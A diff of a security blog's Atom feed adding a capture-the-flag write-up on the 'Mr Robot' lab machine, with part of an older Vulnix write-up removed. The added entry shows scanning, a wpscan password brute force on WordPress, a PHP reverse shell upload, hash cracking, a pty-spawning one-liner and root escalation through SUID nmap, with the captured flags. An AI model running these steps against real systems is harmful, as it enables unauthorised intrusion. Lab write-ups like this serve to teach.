@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-06-30T05:13:30-04:00</updated>
+  <updated>2017-07-01T10:17:59-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,597 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Owning Mr Robot]]></title>
+    <link href="http://chousensha.github.io/blog/2017/07/01/owning-mr-robot/"/>
+    <updated>2017-07-01T04:46:24-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/07/01/owning-mr-robot</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s target was inspired by the Mr Robot series. The goal is to find 3 hidden flags.</p>
+
+<!-- more -->
+
+
+<p>I used Masscan to grab the open ports, which I then passed to Nmap:</p>
+
+<p>```
+masscan -p1-65535 &mdash;banners 192.168.217.145 &mdash;rate=10000</p>
+
+<p>Starting masscan 1.0.3 (<a href="http://bit.ly/14GZzcT">http://bit.ly/14GZzcT</a>) at 2017-07-01 08:49:44 GMT
+ &mdash; forced options: -sS -Pn -n &mdash;randomize-hosts -v &mdash;send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 443/tcp on 192.168.217.145                              <br/>
+Discovered open port 80/tcp on 192.168.217.145</p>
+
+<p>nmap -T4 -p80,443 -A 192.168.217.145
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache httpd
+|<em>http-server-header: Apache
+|</em>http-title: Site doesn&rsquo;t have a title (text/html).
+443/tcp open  ssl/http Apache httpd
+|<em>http-server-header: Apache
+|</em>http-title: Site doesn&rsquo;t have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+```</p>
+
+<p>Just a web server. However, this doesn&rsquo;t look like your regular web app:</p>
+
+<p><img class="center" src="/images/pentest/mr-robot/fsociety.png" title="&lsquo;fsociety&rsquo; &lsquo;fsociety login&rsquo;" ></p>
+
+<p>Interesting, we are in contact with fsociety! I ran each command (type help to see them listed at any time), and here&rsquo;s what we have so far:</p>
+
+<ul>
+<li><p>prepare &ndash; a video that ends with an address that warrants checking: whoismrrobot.com</p></li>
+<li><p>fsociety &ndash; a CLI animation that asks if you are ready to join</p></li>
+<li><p>inform &ndash; a series of news that reveal the hypocrisy of today&rsquo;s (is it really made up?) society</p></li>
+</ul>
+
+
+<p><img class="center" src="/images/pentest/mr-robot/deflated.png" title="&lsquo;sports scandal&rsquo; &lsquo;sports scandal&rsquo;" ></p>
+
+<p><img class="center" src="/images/pentest/mr-robot/space.png" title="&lsquo;space rocket&rsquo; &lsquo;space rocket&rsquo;" ></p>
+
+<p><img class="center" src="/images/pentest/mr-robot/meast.png" title="&lsquo;middle east&rsquo; &lsquo;middle east&rsquo;" ></p>
+
+<p><img class="center" src="/images/pentest/mr-robot/gala.png" title="&lsquo;gala&rsquo; &lsquo;celebrity gala&rsquo;" ></p>
+
+<ul>
+<li>question &ndash; more pictures with hard to accept truths</li>
+</ul>
+
+
+<p><img class="center" src="/images/pentest/mr-robot/america.png" title="&lsquo;patriot&rsquo; &lsquo;american dream&rsquo;" ></p>
+
+<p><img class="center" src="/images/pentest/mr-robot/executive.png" title="&lsquo;executive&rsquo; &lsquo;executive stealing&rsquo;" ></p>
+
+<p><img class="center" src="/images/pentest/mr-robot/capitalist.png" title="&lsquo;capitalism&rsquo; &lsquo;capitalism&rsquo;" ></p>
+
+<p><img class="center" src="/images/pentest/mr-robot/bzns.png" title="&lsquo;business&rsquo; &lsquo;business&rsquo;" ></p>
+
+<ul>
+<li><p>wakeup &ndash; shows some high level executives arguing in a skyscraper</p></li>
+<li><p>join &ndash; fsociety requests your mail address to keep in touch</p></li>
+</ul>
+
+
+<p><img class="center" src="/images/pentest/mr-robot/mail.png" title="&lsquo;enter your mail&rsquo; &lsquo;enter your mail&rsquo;" ></p>
+
+<p>Alright, we had some fun. Now I checked that URL I mentioned earlier for more breadcrumbs:</p>
+
+<p><img class="center" src="/images/pentest/mr-robot/whois.png" title="&lsquo;whois mr robot&rsquo; &lsquo;whois mr robot&rsquo;" ></p>
+
+<p>You can click on the GUI, look around, play some games. There are also some commands you can run in the terminal:</p>
+
+<ul>
+<li><p>fsociety_endgame &ndash; launches a game that you might want to discover for yourself</p></li>
+<li><p>massacre &ndash; launches a movie, but I got a message that content is not available to my location</p></li>
+<li><p>elliot &ndash; shows a GIF</p></li>
+<li><p>fivenine &ndash; looks like a collection of clips related to the Five-Nine attack</p></li>
+<li><p>restart &ndash; another scene from the series</p></li>
+<li><p>join &ndash; get in touch with Mr Robot</p></li>
+<li><p>archive &ndash; shows some of the above commands</p></li>
+</ul>
+
+
+<h2>Flag #1</h2>
+
+<p>When running the commands, you probably noticed that the web path changes to <code>URL/cmdname</code>. I looked for robots.txt, and it looks like Mr Robot isn&rsquo;t the only robot around:</p>
+
+<p><code>
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+</code></p>
+
+<p>We&rsquo;ve found the first flag: <code>073403c8a58a1f80d943455fb30724b9</code></p>
+
+<p>The other things looks like a dictionary file with various strings. Maybe it will come in handy later.</p>
+
+<p>Continuing the web recon, I decided to use a tool that I haven&rsquo;t used before: uniscan!</p>
+
+<h3>uniscan description</h3>
+
+<p>Homepage: <a href="https://sourceforge.net/projects/uniscan/">https://sourceforge.net/projects/uniscan/</a></p>
+
+<blockquote><p>Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.</p></blockquote>
+
+<p>This tool comes in both CLI and GUI form. The GUI interface is plain and simple:</p>
+
+<p><img class="center" src="/images/pentest/mr-robot/uniscan-gui.png" title="&lsquo;uniscan-gui&rsquo; &lsquo;uniscan gui&rsquo;" ></p>
+
+<h3>uniscan options</h3>
+
+<p>```</p>
+
+<h6>#</h6>
+
+<h1>Uniscan project</h1>
+
+<h1><a href="http://uniscan.sourceforge.net/">http://uniscan.sourceforge.net/</a></h1>
+
+<h6>#</h6>
+
+<ol type="a">
+<li>6.3</li>
+</ol>
+
+
+<p>OPTIONS:</p>
+
+<pre><code>-h  help
+-u  &lt;url&gt; example: https://www.example.com/
+-f  &lt;file&gt; list of url's
+-b  Uniscan go to background
+-q  Enable Directory checks
+-w  Enable File checks
+-e  Enable robots.txt and sitemap.xml check
+-d  Enable Dynamic checks
+-s  Enable Static checks
+-r  Enable Stress checks
+-i  &lt;dork&gt; Bing search
+-o  &lt;dork&gt; Google search
+-g  Web fingerprint
+-j  Server fingerprint
+</code></pre>
+
+<p>usage:
+[1] perl ./uniscan.pl -u <a href="http://www.example.com/">http://www.example.com/</a> -qweds
+[2] perl ./uniscan.pl -f sites.txt -bqweds
+[3] perl ./uniscan.pl -i uniscan
+[4] perl ./uniscan.pl -i &ldquo;ip:xxx.xxx.xxx.xxx&rdquo;
+[5] perl ./uniscan.pl -o &ldquo;inurl:test&rdquo;
+[6] perl ./uniscan.pl -u <a href="https://www.example.com/">https://www.example.com/</a> -r
+```</p>
+
+<p>I ran the CLI tool against the target with most of the flags. While described as simple, it checks for plenty of things: Drupal plugins, mobile versions, error message information, interesting HTML strings, performs whois and nslookup lookups, attempts banner grabbing, runs ping, traceroute and Nmap against the target, looks for some specific issues, and more:</p>
+
+<p>```
+Crawler Started:
+| Plugin name: FCKeditor upload test v.1 Loaded.
+| Plugin name: Timthumb &lt;= 1.32 vulnerability v.1 Loaded.
+| Plugin name: Upload Form Detect v.1.1 Loaded.
+| Plugin name: phpinfo() Disclosure v.1 Loaded.
+| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
+| Plugin name: Code Disclosure v.1.1 Loaded.
+| Plugin name: E-mail Detection v.1.1 Loaded.
+| Plugin name: External Host Detect v.1.2 Loaded.
+| [+] Crawling finished, 59 URL&rsquo;s found!</p>
+
+<p>Dynamic tests:
+| Plugin name: Learning New Directories v.1.2 Loaded.
+| Plugin name: FCKedior tests v.1.1 Loaded.
+| Plugin name: Timthumb &lt;= 1.32 vulnerability v.1 Loaded.
+| Plugin name: Find Backup Files v.1.2 Loaded.
+| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
+| Plugin name: Local File Include tests v.1.1 Loaded.
+| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
+| Plugin name: Remote Command Execution tests v.1.1 Loaded.
+| Plugin name: Remote File Include tests v.1.2 Loaded.
+| Plugin name: SQL-injection tests v.1.2 Loaded.
+| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
+| Plugin name: Web Shell Finder v.1.3 Loaded.
+```</p>
+
+<p>And the tool did find some useful information for further compromising the target!</p>
+
+<h1>``` </h1>
+
+<p>|
+| Directory check:
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/Image/">http://192.168.217.145/Image/</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/admin/">http://192.168.217.145/admin/</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/feed/">http://192.168.217.145/feed/</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/image/">http://192.168.217.145/image/</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/login/">http://192.168.217.145/login/</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/rss/">http://192.168.217.145/rss/</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/wp-login/">http://192.168.217.145/wp-login/</a></p>
+
+<h1>| [+] CODE: 200 URL: <a href="http://192.168.217.145/wp-admin/">http://192.168.217.145/wp-admin/</a></h1>
+
+<p>|                                                                                                 <br/>
+| File check:
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/admin/index.html">http://192.168.217.145/admin/index.html</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/admin/index.php">http://192.168.217.145/admin/index.php</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/favicon.ico">http://192.168.217.145/favicon.ico</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/index.html">http://192.168.217.145/index.html</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/index.html%20">http://192.168.217.145/index.html%20</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/index.php">http://192.168.217.145/index.php</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/license.txt">http://192.168.217.145/license.txt</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/readme.html">http://192.168.217.145/readme.html</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/readme">http://192.168.217.145/readme</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/robots.txt">http://192.168.217.145/robots.txt</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/htx/sqlqhit.asp">http://192.168.217.145/search/htx/sqlqhit.asp</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/htx/SQLQHit.asp">http://192.168.217.145/search/htx/SQLQHit.asp</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/sqlqhit.asp">http://192.168.217.145/search/sqlqhit.asp</a>
+| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/SQLQHit.asp">http://192.168.217.145/search/SQLQHit.asp</a></p>
+
+<h1>| [+] CODE: 200 URL: <a href="http://192.168.217.145/sitemap.xml">http://192.168.217.145/sitemap.xml</a></h1>
+
+<p>```</p>
+
+<p>What do you know, a Wordpress instance is running on the server! So it&rsquo;s time for wpscan!</p>
+
+<h3>wpscan description</h3>
+
+<p>Homepage: <a href="https://wpscan.org/">https://wpscan.org/</a></p>
+
+<blockquote><p>WPScan is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.</p></blockquote>
+
+<h3>wpscan options</h3>
+
+<p>```
+wpscan &mdash;help</p>
+
+<hr />
+
+<pre><code>    __          _______   _____                  
+    \ \        / /  __ \ / ____|                 
+     \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+      \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+       \  /\  /  | |     ____) | (__| (_| | | | |
+        \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+    WordPress Security Scanner by the WPScan Team 
+                   Version 2.9.2
+      Sponsored by Sucuri - https://sucuri.net
+</code></pre>
+
+<p>   @<em>WPScan</em>, @ethicalhack3r, @erwan_lr, pvdl, @<em>FireFart</em></p>
+
+<hr />
+
+<p>Help :</p>
+
+<p>Some values are settable in a config file, see the example.conf.json</p>
+
+<p>&mdash;update                            Update the database to the latest version.
+&mdash;url       | -u <target url>       The WordPress URL/domain to scan.
+&mdash;force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
+&mdash;enumerate | -e [option(s)]        Enumeration.
+  option :</p>
+
+<pre><code>u        usernames from id 1 to 10
+u[10-20] usernames from id 10 to 20 (you must write [] chars)
+p        plugins
+vp       only vulnerable plugins
+ap       all plugins (can take a long time)
+tt       timthumbs
+t        themes
+vt       only vulnerable themes
+at       all themes (can take a long time)
+</code></pre>
+
+<p>  Multiple values are allowed : &ldquo;-e tt,p&rdquo; will enumerate timthumbs and plugins
+  If no option is supplied, the default is &ldquo;vt,tt,u,vp&rdquo;</p>
+
+<p>&mdash;exclude-content-based &ldquo;<regexp or string>&rdquo;</p>
+
+<pre><code>                                Used with the enumeration option, will exclude all occurrences based on the regexp or string supplied.
+                                You do not need to provide the regexp delimiters, but you must write the quotes (simple or double).
+</code></pre>
+
+<p>&mdash;config-file  | -c <config file>   Use the specified config file, see the example.conf.json.
+&mdash;user-agent   | -a &lt;User-Agent>    Use the specified User-Agent.
+&mdash;cookie <string>                   String to read cookies from.
+&mdash;random-agent | -r                 Use a random User-Agent.
+&mdash;follow-redirection                If the target url has a redirection, it will be followed without asking if you wanted to do so or not
+&mdash;batch                             Never ask for user input, use the default behaviour.
+&mdash;no-color                          Do not use colors in the output.
+&mdash;log                               Creates a log.txt file with WPScan&rsquo;s output.
+&mdash;no-banner                         Prevents the WPScan banner from being displayed.
+&mdash;disable-accept-header             Prevents WPScan sending the Accept HTTP header.
+&mdash;disable-referer                   Prevents setting the Referer header.
+&mdash;disable-tls-checks                Disables SSL/TLS certificate verification.
+&mdash;wp-content-dir <wp content dir>   WPScan try to find the content directory (ie wp-content) by scanning the index page, however you can specify it.</p>
+
+<pre><code>                                Subdirectories are allowed.
+</code></pre>
+
+<p>&mdash;wp-plugins-dir <wp plugins dir>   Same thing than &mdash;wp-content-dir but for the plugins directory.</p>
+
+<pre><code>                                If not supplied, WPScan will use wp-content-dir/plugins. Subdirectories are allowed
+</code></pre>
+
+<p>&mdash;proxy &lt;[protocol://]host:port>    Supply a proxy. HTTP, SOCKS4 SOCKS4A and SOCKS5 are supported.</p>
+
+<pre><code>                                If no protocol is given (format host:port), HTTP will be used.
+</code></pre>
+
+<p>&mdash;proxy-auth &lt;username:password>    Supply the proxy login credentials.
+&mdash;basic-auth &lt;username:password>    Set the HTTP Basic authentication.
+&mdash;wordlist | -w <wordlist>          Supply a wordlist for the password brute forcer.
+&mdash;username | -U <username>          Only brute force the supplied username.
+&mdash;usernames     &lt;path-to-file>      Only brute force the usernames from the file.
+&mdash;cache-dir       &lt;cache-directory> Set the cache directory.
+&mdash;cache-ttl       &lt;cache-ttl>       Typhoeus cache TTL.
+&mdash;request-timeout &lt;request-timeout> Request Timeout.
+&mdash;connect-timeout &lt;connect-timeout> Connect Timeout.
+&mdash;threads  | -t <number of threads> The number of threads to use when multi-threading requests.
+&mdash;max-threads     &lt;max-threads>     Maximum Threads.
+&mdash;throttle        <milliseconds>    Milliseconds to wait before doing another web request. If used, the &mdash;threads should be set to 1.
+&mdash;help     | -h                     This help screen.
+&mdash;verbose  | -v                     Verbose output.
+&mdash;version                           Output the current version and exit.</p>
+
+<p>Examples :</p>
+
+<p>-Further help &hellip;
+ruby ./wpscan.rb &mdash;help</p>
+
+<p>-Do &lsquo;non-intrusive&rsquo; checks &hellip;
+ruby ./wpscan.rb &mdash;url www.example.com</p>
+
+<p>-Do wordlist password brute force on enumerated users using 50 threads &hellip;
+ruby ./wpscan.rb &mdash;url www.example.com &mdash;wordlist darkc0de.lst &mdash;threads 50</p>
+
+<p>-Do wordlist password brute force on the &lsquo;admin&rsquo; username only &hellip;
+ruby ./wpscan.rb &mdash;url www.example.com &mdash;wordlist darkc0de.lst &mdash;username admin</p>
+
+<p>-Enumerate installed plugins &hellip;
+ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate p</p>
+
+<p>-Enumerate installed themes &hellip;
+ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate t</p>
+
+<p>-Enumerate users &hellip;
+ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate u</p>
+
+<p>-Enumerate installed timthumbs &hellip;
+ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate tt</p>
+
+<p>-Use a HTTP proxy &hellip;
+ruby ./wpscan.rb &mdash;url www.example.com &mdash;proxy 127.0.0.1:8118</p>
+
+<p>-Use a SOCKS5 proxy &hellip; (cURL >= v7.21.7 needed)
+ruby ./wpscan.rb &mdash;url www.example.com &mdash;proxy socks5://127.0.0.1:9000</p>
+
+<p>-Use custom content directory &hellip;
+ruby ./wpscan.rb -u www.example.com &mdash;wp-content-dir custom-content</p>
+
+<p>-Use custom plugins directory &hellip;
+ruby ./wpscan.rb -u www.example.com &mdash;wp-plugins-dir wp-content/custom-plugins</p>
+
+<p>-Update the DB &hellip;
+ruby ./wpscan.rb &mdash;update</p>
+
+<p>-Debug output &hellip;
+ruby ./wpscan.rb &mdash;url www.example.com &mdash;debug-output 2>debug.log</p>
+
+<p>See README for further information.
+```</p>
+
+<p>First, I updated the wpscan databse with <code>wpscan &mdash;update</code>. Then I performed some enumeration on the target:</p>
+
+<p>```
+wpscan &mdash;url <a href="http://192.168.217.145">http://192.168.217.145</a> &mdash;enumerate u vp vt &mdash;no-banner
+[+] URL: <a href="http://192.168.217.145/">http://192.168.217.145/</a>
+[+] Started: Sat Jul  1 07:40:05 2017</p>
+
+<p>[+] robots.txt available under: &lsquo;<a href="http://192.168.217.145/robots.txt">http://192.168.217.145/robots.txt</a>&rsquo;
+[!] The WordPress &lsquo;<a href="http://192.168.217.145/readme.html">http://192.168.217.145/readme.html</a>&rsquo; file exists exposing a version number
+[+] Interesting header: SERVER: Apache
+[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
+[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
+[+] XML-RPC Interface available under: <a href="http://192.168.217.145/xmlrpc.php">http://192.168.217.145/xmlrpc.php</a></p>
+
+<p>[+] WordPress version 4.3.11 (Released on 2017-05-16) identified from rss generator, rdf generator, atom generator, links opml
+[!] 1 vulnerability identified from the version number</p>
+
+<p>[!] Title: WordPress 2.3-4.7.5 &ndash; Host Header Injection in Password Reset</p>
+
+<pre><code>Reference: https://wpvulndb.com/vulnerabilities/8807
+Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
+Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
+Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
+</code></pre>
+
+<p>[+] Enumerating plugins from passive detection &hellip;
+[+] No plugins found</p>
+
+<p>[+] Enumerating usernames &hellip;
+[+] We did not enumerate any usernames</p>
+
+<p>[+] Finished: Sat Jul  1 07:40:07 2017
+[+] Requests Done: 57
+[+] Memory used: 17.109 MB
+[+] Elapsed time: 00:00:02
+```</p>
+
+<p>I couldn&rsquo;t use wpscan&rsquo;s findings for exploitation. Based on our earlier finding of a dictionary file, the next step seems to involve bruteforcing. I went back to the file and looked at its size:</p>
+
+<p><code>
+wc -l fsocity.dic
+858160 fsocity.dic
+</code></p>
+
+<p>Not a small one, but maybe it contains duplicates:</p>
+
+<p><code>
+sort fsocity.dic | uniq | wc -l
+11451
+</code></p>
+
+<p>A little over 11k, much more promising! I created a new file without the duplicates: <code>sort fsocity.dic | uniq > fsociety.txt</code>.</p>
+
+<p>The next step was to visit <a href="http://192.168.217.145/wp-login.php">http://192.168.217.145/wp-login.php</a> and try to gather more information. Bogus login attempts triggered the message: ERROR: Invalid username. Next, I looked in the source to see how form parameters look like:</p>
+
+<p><img class="center" src="/images/pentest/mr-robot/wplogin.png" title="&lsquo;wplogin&rsquo; &lsquo;wplogin&rsquo;" ></p>
+
+<p>It seemed I would have to bruteforce for both username and password, but I tried a few character names from the series first, and that&rsquo;s how I found that elliot is a valid user. With this, I used wpscan to perform the bruteforce attack for the password:</p>
+
+<p>```
+wpscan &mdash;url <a href="http://192.168.217.145/">http://192.168.217.145/</a> &mdash;wordlist ~/Downloads/fsociety.txt &mdash;username elliot
+[&hellip;]
+[+] Starting the password brute forcer
+  [+] [SUCCESS] Login : elliot Password : ER28-0652</p>
+
+<p>  Brute Forcing &lsquo;elliot&rsquo; Time: 00:02:27 &lt;==================================                                    > (5640 / 11452) 49.24%  ETA: 00:02:32
+  +&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+  | Id | Login  | Name | Password  |
+  +&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+  |    | elliot |      | ER28-0652 |
+  +&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+```</p>
+
+<p>Excellent, wpscan found the password is <em>ER28-0652</em>! I logged in and noticed that all the plugins are outdated:</p>
+
+<p><img class="center" src="/images/pentest/mr-robot/plugins.png" title="&lsquo;wp plugins&rsquo; &lsquo;wp plugins&rsquo;" ></p>
+
+<p>I tried uploading a PHP reverse shell as plugin, but got an error that it couldn&rsquo;t install it. I looked in other places where I could upload it, and when browsing the Media tab, I noticed my shell was there :O</p>
+
+<p><img class="center" src="/images/pentest/mr-robot/media.png" title="&lsquo;media library&rsquo; &lsquo;media library&rsquo;" ></p>
+
+<p>Wasn&rsquo;t sure where it placed in, so I just tried adding shell.php to the URL, and Wordpress kindly gave me the correct path to it, which was <a href="http://192.168.217.145/wp-content/uploads/2017/07/shell.php">http://192.168.217.145/wp-content/uploads/2017/07/shell.php</a></p>
+
+<h2>Flag #2</h2>
+
+<p>Finally achieved presence on the machine:</p>
+
+<p><code>
+$ whoami
+daemon
+$ ls /home
+robot
+$ ls -la /home/robot
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+</code></p>
+
+<p>Found the second flag, but couldn&rsquo;t read it. However, that md5 file was readable:</p>
+
+<p><code>
+$ cat /home/robot/password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+</code></p>
+
+<p>I cracked the MD5 hash to reveal the password <em>abcdefghijklmnopqrstuvwxyz</em> for the user robot. I tried switching to that user, but I got the following error:</p>
+
+<p><code>
+$ su robot
+su: must be run from a terminal
+</code></p>
+
+<p>The error appears because the shell isn&rsquo;t interactive. But I ran into this before, and again <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">pentestmonkey&rsquo;s oneliners</a> came to the rescue:</p>
+
+<p>```
+$ python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
+$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz</p>
+
+<p>robot@linux:/$
+```</p>
+
+<p>I grabbed the second flag, and noticed that my commands are now echoed in the terminal and it&rsquo;s annoying:</p>
+
+<p><code>
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+</code></p>
+
+<h2>Flag #3</h2>
+
+<p>I couldn&rsquo;t find a workaround for that, so I just continued. When I looked for SUID binaries, I found a surprise:</p>
+
+<p><code>
+robot@linux:/$ find / -type f \( -perm +4000 -o -perm +2000 \) -print 2&gt; /dev/null
+[...]
+/usr/local/bin/nmap
+</code></p>
+
+<p>After Googling, there even seems to be a <a href="https://www.rapid7.com/db/modules/exploit/unix/local/setuid_nmap">setuid Nmap exploit</a> in Metasploit! I read more about this problem, and found an interesting <a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">SANS paper</a> (the Nmap stuff begins on page 11). After some reading, I found that older versions of Nmap had an interactive mode, where you could run shell commands from or drop into a shell (similar to mysql):</p>
+
+<p>```
+robot@linux:/$ nmap &mdash;interactive
+nmap &mdash;interactive</p>
+
+<p>Starting nmap V. 3.81 ( <a href="http://www.insecure.org/nmap/">http://www.insecure.org/nmap/</a> )
+Welcome to Interactive Mode &mdash; press h <enter> for help
+nmap>
+```</p>
+
+<p>The Nmap version is 3.81, so I tried it out:</p>
+
+<p><code>
+nmap&gt; !whoami
+!whoami
+root
+waiting to reap child : No child processes
+</code></p>
+
+<p>It did work! Game over, Mr Robot!</p>
+
+<p>```
+nmap> !sh
+!sh</p>
+
+<h1>ls /root</h1>
+
+<p>ls /root
+firstboot_done  key-3-of-3.txt</p>
+
+<h1>cat /root/key-3-of-3.txt</h1>
+
+<p>cat /root/key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+```</p>
+
+<p>Another interesting challenge, more story driven. It reminded me of <a href="https://chousensha.github.io/blog/2016/03/11/pentest-lab-primer/">Primer</a>.</p>
+
+<p><strong>Learn more</strong></p>
+
+<ul>
+<li><p><a href="https://blog.sucuri.net/2015/12/using-wpscan-finding-wordpress-vulnerabilities.html">Using wpscan to find Wordpress vulnerabilities</a></p></li>
+<li><p><a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">Attack and Defend: Linux Privilege Escalation Techniques of 2016</a></p></li>
+</ul>
+
+
+<p>```</p>
+
+<hr />
+
+<p>/ You have literary talent that you \
+\ should take pains to develop.     /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[wafw00f - Kali Linux tools]]></title>
@@ -862,453 +1453,6 @@ Not valid after:  May 29 12:00:00 2018 GMT
 
 <p>/ Q: Do you know what the death rate \
 \ around here is? A: One per person. /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[HackLAB Vulnix]]></title>
-    <link href="http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix/"/>
-    <updated>2017-06-20T08:04:29-04:00</updated>
-    <id>http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix</id>
-    <content type="html"><![CDATA[<p>Vulnix is an older machine from VulnHub that intends to present vulnerabilities from a misconfiguration point of view. The goal is to get the flag inside /root</p>
-
-<!-- more -->
-
-
-<p>Here are the Nmap results:</p>
-
-<p><code>
-PORT      STATE SERVICE    VERSION
-22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
-25/tcp    open  smtp       Postfix smtpd
-79/tcp    open  finger     Linux fingerd
-110/tcp   open  pop3?
-111/tcp   open  rpcbind    2-4 (RPC #100000)
-143/tcp   open  imap       Dovecot imapd
-512/tcp   open  exec       netkit-rsh rexecd
-513/tcp   open  login
-514/tcp   open  tcpwrapped
-993/tcp   open  ssl/imap   Dovecot imapd
-995/tcp   open  ssl/pop3s?
-2049/tcp  open  nfs_acl    2-3 (RPC #100227)
-36190/tcp open  status     1 (RPC #100024)
-40731/tcp open  mountd     1-3 (RPC #100005)
-43539/tcp open  nlockmgr   1-4 (RPC #100021)
-46423/tcp open  mountd     1-3 (RPC #100005)
-52024/tcp open  mountd     1-3 (RPC #100005)
-</code></p>
-
-<h3>finger user enumeration</h3>
-
-<p>There are quite a few services listening on the host. One of the first things that grabbed my attention was finger running on port 79. Because of this, we can use finger to perform <a href="https://pentestlab.blog/tag/finger/">user enumeration</a> on the host. We can use Nmap&rsquo;s script scan to see who is logged on the host, or do it manually. Here I will show the manual way:</p>
-
-<p><code>
-finger @192.168.217.142
-No one logged on.
-</code></p>
-
-<p>The same thing can be achieved by running Nmap with the <em>-sC</em> flag. Next I tried to get more information about the root user:</p>
-
-<p><code>
-finger root@192.168.217.142
-Login: root                     Name: root
-Directory: /root                        Shell: /bin/bash
-Never logged in.
-No mail.
-No Plan.
-</code></p>
-
-<p>It seems the root user never logged in, but we still obtained the directory and shell that root uses. I tried a few more guesses and discovered a couple more users on the host:</p>
-
-<p>```
-finger <a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#117;&#115;&#x65;&#114;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x32;&#49;&#x37;&#x2e;&#49;&#52;&#50;">&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#50;&#49;&#x37;&#46;&#x31;&#x34;&#x32;</a>
-Login: user                     Name: user
-Directory: /home/user                   Shell: /bin/bash
-Never logged in.
-No mail.
